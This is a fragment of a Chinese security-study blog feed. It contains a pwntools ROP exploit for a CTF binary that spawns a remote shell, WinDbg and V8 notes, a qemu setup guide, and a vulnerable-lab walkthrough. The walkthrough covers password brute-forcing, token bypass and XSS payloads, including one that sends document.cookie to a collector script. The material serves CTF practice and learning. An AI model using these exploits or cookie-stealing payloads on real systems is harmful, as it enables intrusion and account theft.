class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs #!usr/bin/python"> #coding=utf-8<br>from pwn import *<br> # context.log_level = 'debug'<br>io = remote('124.126.19.106',46612)<br> # io = process("./pwn-100")<br>elf = ELF("./pwn-100")<br>rop1 = 0x40075A #pop rbx_rbp_r12_r13_r14_r15<br>rop2 = 0x400740 #rdx(r13), rsi(r14), edi(r15d)<br>pop_rdi_ret = 0x400763<br> # start_addr = elf.symbols['_start']<br>start_addr = 0x400550<br>puts_plt = elf.plt['puts']<br>read_got = elf.got['read']<br>binsh_addr = 0x601000<br>def leak(addr):<br>  payload = "a" * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)<br>  payload = payload.ljust(200, "a")<br>  io.send(payload)<br>  io.recvuntil("bye~\n")<br>  up = ""<br>  content = ""<br>  count = 0<br>  while True:<br>    c = io.recv(numb=1, timeout=0.5)<br>    count += 1<br>    if up == '\n' and c == "":<br>        content = content[:-1] + '\x00'<br>        break<br>    else:<br>        content += c<br>        up = c<br>  content = content[:4]<br>  log.info("%#x =&gt; %s" % (addr, (content or '').encode('hex')))<br>  return content<br>d = DynELF(leak, elf = elf)<br>sys_addr = d.lookup('system', 'libc')<br>log.info("system_addr =&gt; %#x", sys_addr)<br>payload  = "a" * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)<br>payload += p64(rop2)<br>payload += "\x00" * 56  <br>payload += p64(start_addr)<br>payload  = payload.ljust(200, "a")<br>io.send(payload)<br>io.recvuntil("bye~\n")<br> # gdb.attach(io)<br>io.send("/bin/sh\x00")<br>payload = "a" * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)<br>payload = payload.ljust(200, "a")<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;查壳：checksec&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/05/31/mfOTnUiRdaM</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>WinDbg使用整理</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/</id>
    <published>2022-08-09T03:17:04.136Z</published>
    <updated>2022-08-09T03:50:36.972Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-基础命令"><a href="#0x00-基础命令" class="headerlink" title="0x00 基础命令"></a>0x00 基础命令</h2><ul><li>.sympath　　//显示设置的符号表路径</li><li>.reload　　　　//此命令主要用于加载符号表。</li><li>.reload /f　　//重新装载模块</li><li>.reload /i　　//强制加载mismatched symbol</li><li>U　　//这个命令主要用于反汇编某个地址，其后面可以跟函数名和地址。U命令后面可以加L表示延长反汇编长度</li><li>db　　//显示一字节的长度。</li><li>dw　　//显示两字节的长度。</li><li>dd　　//显示四字节的长度。</li><li>dq　　//显示八字节的长度。</li><li>dD　　//显示double实数(8字节的长度)。</li><li>df　　//显示float实数(4字节的长度)。</li><li>da     //显示asscii值</li><li>du     //显示unicode值</li><li>ds     //显示ANI_STRING值</li><li>dS     //显示UNICODE_STRING的值</li><li>eb address value　　//在address 这个地址写入一个字节value</li><li>ew address value　　//在address 这个地址写入两字节value</li><li>ed address value　　//在address 这个地址写入四字节字节value</li><li>eq address value　　//在address 这个地址写入八字节字节value</li></ul><h2 id="0x01-对象相关命令"><a href="#0x01-对象相关命令" class="headerlink" title="0x01 对象相关命令"></a>0x01 对象相关命令</h2><ul><li>dt　　//dt命令主要用于查看结构体。</li><li>lm　　//列出模块。</li><li>lm vm 模块名　　//查看模块详细信息。 </li><li>!process 0 0 　　　　//列出系统进程信息</li><li>!process 0 0 进程名  //列出该进程的信息</li><li>!process 0 1 进程名  //列出该进程更加的信息</li><li>!process 0 7 进程名  //列出该进程的详细信息，包括线程的</li><li>.process EPROCESS　　//切入该进程中</li><li>!object 地址　　//显示该地址的对象信息。</li><li>bp address  //在地址address插入断点。</li><li>ba命令是是硬件断点命令，通过设置cpu的dx寄存器来拦截线程。</li><li>ba access size 地址　　//access 是访问的方式，比如 e (执行)，r (读/写)，w (写) ，size是监控访问的位置 的大小，以字节为单位。值 为 1、2或4，在64位机器上还可以是8。</li><li>bd/be/bc</li><li>bd 断点号 //此命令是关闭断点号所对应的断点 。</li><li>be 断点号 //此命令是开启断点号所对应的断点 。</li><li>bc *　　　//去除所有断点。</li><li>x   //x命令用来模糊查询</li><li>x nt!kes<em>des</em>table*   //样查看SSDT表的地址</li><li>dds 地址 //此命令用来解析某连续地址的函数名。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-基础命令&quot;&gt;&lt;a href=&quot;#0x00-基础命令&quot; class=&quot;headerlink&quot; title=&quot;0x00 基础命令&quot;&gt;&lt;/a&gt;0x00 基础命令&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;.sympath　　//显示设置的符号表路径&lt;/li&gt;
&lt;li&gt;.rel</summary>
      
    
    
    
    
    <category term="学习笔记" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>V8漏洞初学习</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-08-09T03:17:04.132Z</published>
    <updated>2022-08-09T03:49:51.822Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V8基础"><a href="#V8基础" class="headerlink" title="V8基础"></a>V8基础</h1><p>v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的</p><blockquote><p>v8编译后二进制名称叫d8.</p></blockquote><h2 id="allow-natives-syntax选项"><a href="#allow-natives-syntax选项" class="headerlink" title="allow-natives-syntax选项"></a>allow-natives-syntax选项</h2><p>定义了一些v8运行时支持函数，以便于本地调试：</p><figure class="highlight prolog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs prolog">browser/x64.release$ ./d8 --allow-natives-syntax<br><span class="hljs-symbol">V8</span> version <span class="hljs-number">7.5</span><span class="hljs-number">.0</span> (candidate)<br>d8&gt; var a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br>undefined<br>d8&gt; <span class="hljs-comment">%DebugPrint(a);</span><br><span class="hljs-number">0x2ebcfb54dd41</span> &lt;<span class="hljs-symbol">JSArray</span>[<span class="hljs-number">3</span>]&gt;<br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>d8&gt; <span class="hljs-comment">%SystemBreak();</span><br><span class="hljs-symbol">Trace</span>/breakpoint trap (core dumped)<br></code></pre></td></tr></tbody></table></figure><p>在加载d8时加入此选项可以在js中调试本地运行时函数：</p><p><code>%DebugPrint(obj) 输出对象地址</code><br><code>%SystemBreak() 触发调试中断主要结合gdb等调试器使用</code></p><p>gdb的gdbinit脚本可以使gdb中就能可视化显示v8的对象结构，将该脚本下载重命名为gdbinit_v8并添加至/.gdbinit脚本：</p><p><code>source /path/to/gdbinit_v8</code></p><p>下面将allow-natives-syntax选项和gdbinit结合使用，编写test.js：</p><figure class="highlight haml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs haml">var a = [1,2,3];<br>var b = [1.1, 2.2, 3.3];<br>var c = [a, b];<br><span class="hljs-tag">%<span class="hljs-selector-tag">DebugPrint</span>(a)</span>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">SystemBreak</span>()</span>;  //触发第一次调试<br><span class="hljs-tag">%<span class="hljs-selector-tag">DebugPrint</span>(b)</span>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">SystemBreak</span>()</span>;  //触发第二次调试<br><span class="hljs-tag">%<span class="hljs-selector-tag">DebugPrint</span>(c)</span>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">SystemBreak</span>()</span>;  //触发第三次调试<br></code></pre></td></tr></tbody></table></figure><p>gdb运行d8:</p><figure class="highlight elixir"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/ctf/browser/x64</span>.release<span class="hljs-variable">$ </span>gdb ./d8<br>pwndbg&gt; set args --allow-natives-syntax ./test.js<br>pwndbg&gt; r<br><span class="hljs-title class_">Starting</span> <span class="hljs-symbol">program:</span> x64.release/d8 --allow-natives-syntax ./test.js<br>[<span class="hljs-title class_">Thread</span> debugging using libthread_db enabled]<br>[<span class="hljs-title class_">New</span> <span class="hljs-title class_">Thread</span> <span class="hljs-number">0x7ff87fde9700</span> (<span class="hljs-title class_">LWP</span> <span class="hljs-number">18393</span>)]<br>[<span class="hljs-title class_">New</span> <span class="hljs-title class_">Thread</span> <span class="hljs-number">0x7ff87f5e8700</span> (<span class="hljs-title class_">LWP</span> <span class="hljs-number">18394</span>)]<br>[<span class="hljs-title class_">New</span> <span class="hljs-title class_">Thread</span> <span class="hljs-number">0x7ff87ede7700</span> (<span class="hljs-title class_">LWP</span> <span class="hljs-number">18395</span>)]<br><span class="hljs-number">0x12e891f8df11</span> &lt;<span class="hljs-title class_">JSArray</span>[<span class="hljs-number">3</span>]&gt;            <br></code></pre></td></tr></tbody></table></figure><p>可以发现，程序打印了数组对象a的内存地址，并且SystemBreak触发了gdb的中断。</p><p>此时就可以利用上面已经加入的gdbinit脚本中包含的命令调试对象结构，主要使用job命令，可以可视化显示js对象的内存结构。</p><p>v8在内存中只有数字和对象梁忠表示，为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。对象a世内存地址为0x12e891f8df10。</p><p>telescope命令查看内存数据。</p><p>在gdb中使用c命令继续运行，发现停在了第二次SystemBreak的地方，然后用job命令查看第二个对象b的地址，根据上面的套路，可知对象b的实际内存地址为0x244de278df58.</p><h2 id="v8的对象结构"><a href="#v8的对象结构" class="headerlink" title="v8的对象结构"></a>v8的对象结构</h2><p>和vb等语言的解析类似，JS是一种解释之行语言，v8本质上是一个JS的解释执行程序。</p><p>首先，需要了解v8解析执行javaScript语句的基本流程：v8在读取js语句后，首先将这条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。</p><p>为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阈值后，就会将这段语法树直接转换为机器码，后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为byte code字节码，大大加快了执行速度，这就是著名的JIT优化。</p><p>但是这样的性能优化虽然加快了程序的执行，但也带来了很多的安全问题，如果v8本来通过JIT引擎为某段语法树比如a+b假发计算生成了一段机器码<code>add eax,ebx</code>，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出这个改变，就会造成a和b对象在假发运算时的类型混淆。</p><p>一个对象在内存中布局大致如下：</p><ul><li>map:表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型</li><li>prototype：prototype</li><li>elements:对象元素</li><li>length:元素个数</li><li>properties:属性</li></ul><p>数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处，也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址，如图：</p><p><img src="https://i.loli.net/2020/07/17/JCK5EwuRAc8SQTn.png" alt="1.PNG"></p><p>由于浏览器的漏洞利用几乎都要基于对象结构来实现，因此熟悉上述v8对象的内存布局，对后续会很有帮助。</p><blockquote><p>上述内存布局是FloatArray的内存布局，其他类型的Array与其类似，但不完全相同。</p></blockquote><h2 id="浏览器V8的解题步骤"><a href="#浏览器V8的解题步骤" class="headerlink" title="浏览器V8的解题步骤"></a>浏览器V8的解题步骤</h2><p>一般浏览器的出题有两种，以中山市diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。出题者通常会提供一个idf文件，或直接给出一个编译后diff补丁后的浏览器程序，如果只给了一个diff文件，则需要我们自己去下载相关commit源码，然后本地打上diff补丁，编译出浏览器程序在进行本地调试。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.codercto.com/a/81538.html">https://www.codercto.com/a/81538.html</a></p><p>后续需要实践做一下这个ctf题目。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;V8基础&quot;&gt;&lt;a href=&quot;#V8基础&quot; class=&quot;headerlink&quot; title=&quot;V8基础&quot;&gt;&lt;/a&gt;V8基础&lt;/h1&gt;&lt;p&gt;v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的&lt;/p&gt;
&lt;blockquot</summary>
      
    
    
    
    
    <category term="chrome_bug" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome-bug/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu下buildroot以及qemu环境搭建</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2022-08-09T03:17:04.125Z</published>
    <updated>2022-08-09T03:48:44.635Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-搭建环境"><a href="#0x00-搭建环境" class="headerlink" title="0x00 搭建环境"></a>0x00 搭建环境</h1><p>windows 10<br>VMwareWorkstation pro<br>Ubuntu 16.04 x64</p><h1 id="0x01-安装binwalk"><a href="#0x01-安装binwalk" class="headerlink" title="0x01 安装binwalk"></a>0x01 安装binwalk</h1><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo su<br>sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-built_in">remove</span> binwalk<br>sudo spt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br>sudo apt-<span class="hljs-built_in">get</span> install build-essential autoconf git //获取Git<br>git clone https://github.<span class="hljs-keyword">com</span>/devttys0/binwalk<br><span class="hljs-keyword">cd</span> binwalk<br>sudo <span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> install<br>sudo ./deps.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></tbody></table></figure><h1 id="0x02-安装buildroot交叉编译环境"><a href="#0x02-安装buildroot交叉编译环境" class="headerlink" title="0x02 安装buildroot交叉编译环境"></a>0x02 安装buildroot交叉编译环境</h1><p>安装依赖：</p><p><code>sudo apt-get install libncurses5-dev patch</code></p><p>下载buildroot:</p><p><code>wget https://buildroot.org/downloads/buildroot-2020.02.6.tar.gz </code></p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxvf buildroot-<span class="hljs-number">2020</span>.<span class="hljs-number">02</span>.<span class="hljs-number">6</span>.tar.gz<br><span class="hljs-attribute">cd</span> buildroot-<span class="hljs-number">2020</span>.<span class="hljs-number">02</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">make</span> clean<br><span class="hljs-attribute">make</span> menuconfig<br></code></pre></td></tr></tbody></table></figure><p>出现配置界面：</p><ul><li>选择target options-&gt;target Architecture-&gt;MIPS(Little endian),代表MIPS小端序</li><li>在toolChain–&gt;Kelnel Headers,选择自己主机内核版本或更低版本。</li><li>保存退出</li></ul><p><code>sudo make</code></p><p>静等完成。</p><p>os：编译的时候需要大内存，我分配个虚拟机的内存太小，导致编译失败了好几次……此处多谢Prowes5帮我找到了原因呜呜呜。</p><p>测试：</p><figure class="highlight jboss-cli"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./mipsel-linux-gcc</span> hello.c -o hello<br><span class="hljs-string">./hello</span> <span class="hljs-string">//</span>失败<br></code></pre></td></tr></tbody></table></figure><p>使用file查看，是小端序的mips程序。</p><h1 id="0x03-qemu运行环境"><a href="#0x03-qemu运行环境" class="headerlink" title="0x03 qemu运行环境"></a>0x03 qemu运行环境</h1><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install qemu<br>sudo apt-<span class="hljs-built_in">get</span> install qemu-user-static<br></code></pre></td></tr></tbody></table></figure><p>测试hello报错<code>/lib/ld-uClibc.so.0: No such file or directory</code></p><p>是因为没有对应架构的链接库的问题<br>在目录output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/下，</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> cp ld-uClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span>.so /lib/<br><span class="hljs-attribute">sudo</span> chown -R root:root /lib/ld-uClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">31</span>.so<br><span class="hljs-attribute">sudo</span> ln -s /lib/ld-uClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span>.so /lib/ld-uClibc.so.<span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure><p>还是不行，cd /lib目录下，删掉了原来的ld-uClibc.so.0文件，然后重新输入命令。</p><p>出现新报错：<code>/home/test/buildroot-2019.02.4/hello: can't load library 'libc.so.0'</code></p><p>解决方案：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> cp libuClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">31</span>.so /lib/<br><span class="hljs-attribute">sudo</span> chown -R root:root /lib/libuClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span>.so<br><span class="hljs-attribute">sudo</span> ln -s /lib/libuClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span>.so /lib/libc.so.<span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure><p>还是出现了文件不对应问题，cd /lib下删掉了原来的libc.so.0文件，继续重新输入命令。</p><p>运行成功。</p><p>os:为了找到出错点，我真是已经切换目录切换到全都背下来了……真的是一搭环境总会碰到所有的问题……霉霉本霉了。</p><h1 id="0x04-配置网络环境"><a href="#0x04-配置网络环境" class="headerlink" title="0x04 配置网络环境"></a>0x04 配置网络环境</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-搭建环境&quot;&gt;&lt;a href=&quot;#0x00-搭建环境&quot; class=&quot;headerlink&quot; title=&quot;0x00 搭建环境&quot;&gt;&lt;/a&gt;0x00 搭建环境&lt;/h1&gt;&lt;p&gt;windows 10&lt;br&gt;VMwareWorkstation pro&lt;br&gt;Ubu</summary>
      
    
    
    
    
    <category term="IOT" scheme="https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>pikachu漏洞练习记录1</title>
    <link href="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/"/>
    <id>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/</id>
    <published>2022-08-09T03:17:04.119Z</published>
    <updated>2022-08-09T03:42:57.758Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-暴力破解"><a href="#0x01-暴力破解" class="headerlink" title="0x01 暴力破解"></a>0x01 暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>开启bp抓包，对username,password字段的字典做爆破，得到admin/123456.</p><h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><p>随意输入账户密码，bp抓包，发送到重发器，修改密码后重新发送，发现未报错验证码错误，证明验证码没有进行时效性验证，可重复提交使用。</p><p>将流量包发送到测试器，对用户名和密码进行字典爆破，登录成功。</p><h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><p>同上步骤bp抓包，对用户密码进行爆破即可。后来查了一下这俩的区别。</p><p>查看源码，输入的验证码在本地验证：</p><p><img src="https://i.loli.net/2020/11/02/L4V56WHMm1JPDhc.png" alt="捕获.PNG"></p><p>可以在bp上不输入验证码或输入错误验证码都可以爆破。</p><h2 id="token防爆破？"><a href="#token防爆破？" class="headerlink" title="token防爆破？"></a>token防爆破？</h2><blockquote><p>token:token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个token便将此token返回给客户端，以后客户端只需要带着这个token前来请求数据即可。</p></blockquote><h3 id="基于token的身份验证"><a href="#基于token的身份验证" class="headerlink" title="基于token的身份验证"></a>基于token的身份验证</h3><ul><li>客户端使用用户名和密码请求登录</li><li>服务端收到请求去验证用户名和密码</li><li>验证成功后，服务端会签发一个token，再将token发送给客户端</li><li>客户端收到token后可以将它存储起来，比如放在cookie中或Local Storage里。</li><li>客户端每次向服务端请求资源的时候需要带着服务端签发的token</li><li>服务端收到请求，验证客户端请求里带着的token，如果验证成功，就像客户端返回请求的数据。</li><li>app登录的时候发送加密的用户名和密码到服务器，服务器验证用户名和密码，如果成功，以某种方式比如随机生成32位的字符串作为token，存储到服务器中，并返回token到app</li></ul><p>提交用户密码时页面会提交一个hidden属性的token值，每次提交都会更新，但每次产生的token以明文形式传到前端，我们可以在破解之前获取token值，填到字典中即可进行暴力破解。</p><p><img src="https://i.loli.net/2020/11/02/dlBS7qgfN9cYiIP.png" alt="捕获.PNG"></p><p>在测试器中，设置password和token两个变量，使用pitchfork。</p><p>点击<b>选项</b>，更改请求引擎中线程数为1，重定向选择<b>总是</b></p><p><b>Grep-Extract</b>选择<b>添加</b>，中间<b>获得回应包</b><br>，选择token的值复制并选定，点击OK.</p><p><img src="https://i.loli.net/2020/11/02/uLlDMSy46Qp8x2e.png" alt="捕获.PNG"></p><p>回到payload,set为1时设置简单清单，使用字典或自己随便输入密码。set为2时设置递归搜索，并如图黏贴token值。</p><p><img src="https://i.loli.net/2020/11/02/gHncFXtKMUB9udA.png" alt="捕获.PNG"></p><p>开始攻击，根据不同length找出正确密码，爆破完成。</p><p>注：该方法着实鸡肋。</p><h1 id="0x02-XSS-跨站脚本"><a href="#0x02-XSS-跨站脚本" class="headerlink" title="0x02 XSS(跨站脚本)"></a>0x02 XSS(跨站脚本)</h1><p>XSS是一种发生在前端浏览器端的漏洞，危害对象也是前端用户，形成XSS漏洞的主要原因是程序对输入输出没有做合适的处理，导致精心构造的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p><p>因此在XSS漏洞的防范上一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理。</p><ul><li>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入。</li><li>输出转义：根据输出点的位置对输出到前端的额呢绒进行适当转义。</li></ul><h2 id="反射性xss-get"><a href="#反射性xss-get" class="headerlink" title="反射性xss(get)"></a>反射性xss(get)</h2><p>随意输入字符串，回显<b>who is xxx,i don’t care</b><br>f12查看，允许输入最大长度为20.</p><p><img src="https://i.loli.net/2020/11/03/vpRrZbsNSgJcqAj.png" alt="捕获.PNG"></p><p>更改一下可输入长度，输入一个简单的xss语句：<code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code></p><p>发现可以解析，即存在xss漏洞。</p><p><img src="https://i.loli.net/2020/11/03/hrEMJyIq98Cs2Vm.png" alt="捕获.PNG"></p><p>观察源码可知，它将提交的信息重新发送回来，后台没有对我们提交的信息做任何的漏洞。GET型的xss，一般将带有xss的url伪装后发送给目标即可。</p><p>如果是post型xss，无法直接使用url的方式进行攻击。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>需要一个接受cookie的服务器（127.0.0.1：80），来接收受害主机的cookie。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs #getcookie.php(把接收的cookie存到cookie.txt文件)">&lt;?php<br>$cookie=$_GET['cookie'];<br> #fp=$fopen("cookie.txt","a");<br>fwirte($fp,"Cookie:".$cookie."/n")<br>?&gt;<br></code></pre></td></tr></tbody></table></figure><ul><li>构造一个xss攻击的js代码</li></ul><p><code>&lt;script&gt;window.open("http://127.0.0.1/getcookie.php?cookie="+document.cookie);&lt;/script&gt;</code></p><p>新弹出窗口成功获取到cookie。但是cookie.txt中并没有存储到cookie值……</p><p><img src="https://i.loli.net/2020/11/04/thZo6fBkLyegRJj.png" alt="捕获.PNG"></p><h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>post型漏洞一般是使用表单方式进行提交，无法直接使用url进行攻击。</p><p>可以通过html页面方式提交，构造一个自己的post丢到自己的网站上</p><p>随意输入字符提交，发现它并未在url中进行提交，说明我们不能将恶意代码嵌入到url中发送。</p><p><img src="https://i.loli.net/2020/11/04/AOsxdLSJibDw8I6.png" alt="捕获.PNG"></p><p><img src="https://i.loli.net/2020/11/04/Tk6q81ICzpZtLdu.png" alt="捕获.PNG"></p><blockquote><p>http中get和post的基本区别：<br>get方式在客户端通过url提交数据，数据在url中可以看到；<br>Post方式，数据放置在html header内提交，数据在url中看不到。<br>get只能传输比较少的数据，安全性较低，post传输数据较多。</p></blockquote><p>我们可以构造一个带有表单提交的页面，让用户在登录完成后去点击，就可以盗取用户的cookie里。</p><h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>存储型xss下攻击者可以将脚本注入到后台存储起来构成更加持久的危害。<br>存储型xss又称永久型xss。</p><p>1.打开实验，页面是一个留言板，尝试输入1111，发现输入被存储。输入单引号双引号尖括号，发现可以正常输出，说明后台没进行过滤。</p><p><img src="https://i.loli.net/2020/11/04/UcbkOZPM56XoAGw.png" alt="捕获.PNG"></p><p>2.注入<code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code> 